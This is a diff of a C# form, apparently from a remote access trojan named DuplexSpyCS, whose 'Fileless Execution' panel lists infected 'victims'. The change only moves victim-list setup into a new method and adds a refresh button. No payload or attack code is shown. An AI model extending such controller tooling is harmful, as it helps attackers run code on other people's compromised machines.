@@ -126,19 +126,8 @@ namespace DuplexSpyCS
             }
         }
 
-        void fnSetup()
+        void fnInit()
         {
-            //Controls
-            listView1.FullRowSelect = true;
-            listView1.CheckBoxes = true;
-
-            Text = $"Fileless Execution | Victim[{m_lsVictim.Count}]";
-            toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
-            toolStripStatusLabel2.Text = string.Empty;
-
-            radioButton3.Checked = true;
-
-            //setup
             foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
@@ -156,6 +145,21 @@ namespace DuplexSpyCS
                     "init",
                 });
             }
+        }
+
+        void fnSetup()
+        {
+            //Controls
+            listView1.FullRowSelect = true;
+            listView1.CheckBoxes = true;
+
+            Text = $"Fileless Execution | Victim[{m_lsVictim.Count}]";
+            toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
+            toolStripStatusLabel2.Text = string.Empty;
+
+            radioButton3.Checked = true;
+
+            fnInit();
         }
 
         private void frmFilelessExec_Load(object sender, EventArgs e)
@@ -295,6 +299,11 @@ namespace DuplexSpyCS
         private void radioButton3_CheckedChanged(object sender, EventArgs e)
         {
             textBox2.Enabled = !radioButton3.Checked;
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            fnInit();
         }
     }
 }
